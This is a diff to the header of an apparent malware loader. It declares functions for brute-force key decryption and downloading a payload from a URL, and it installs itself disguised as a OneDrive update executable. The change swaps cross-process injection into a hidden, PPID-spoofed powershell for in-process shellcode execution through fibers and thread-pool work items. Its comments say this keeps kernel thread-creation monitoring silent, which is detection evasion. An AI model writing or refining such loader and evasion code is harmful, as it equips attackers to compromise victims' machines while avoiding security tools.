@@ -186,12 +186,14 @@ BOOL BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sK
 // ----------- Staging -----------
 BOOL DownloadPayload(IN PAPI_HASHING pApi, IN LPCSTR szUrl, OUT PBYTE* ppData, OUT PDWORD pdwSize);
 
-// ----------- Injection -----------
-// Spawns powershell.exe hidden with PPID=explorer.exe (PPID spoof),
-// injects shellcode via cross-process NtCreateSection + NtMapViewOfSection
-// (VAD shows Mapped, not MEM_PRIVATE), starts via NtCreateThreadEx,
-// then self-terminates the loader process.
-BOOL InjectIntoProcess(IN PNTAPI_FUNC pNtApis, IN PBYTE pShellcode, IN DWORD dwShellcodeSize);
+// ----------- In-process execution -----------
+// Allocates private RW memory, copies shellcode, flips to RX/RWX.
+// Primary: ConvertThreadToFiber + CreateFiber(SpoofCallback) + SwitchToFiber
+//   (Poison Fiber — no new OS thread, PsSetCreateThreadNotifyRoutine silent).
+// Fallback: TpAllocWork(SpoofCallback) + TpPostWork +
+//   NtWaitForSingleObject(NtCurrentProcess, alertable=TRUE) → Wait:UserRequest.
+// Caller must wipe and free pShellcode after this returns.
+BOOL ExecuteInProcess(IN PNTAPI_FUNC pNtApis, IN PAPI_HASHING pWinApis, IN PBYTE pShellcode, IN DWORD dwShellcodeSize);
 
 // ----------- Install -----------
 // Copies self to %APPDATA%\OneDrive\Updates\OneDriveUpdateSync.exe.
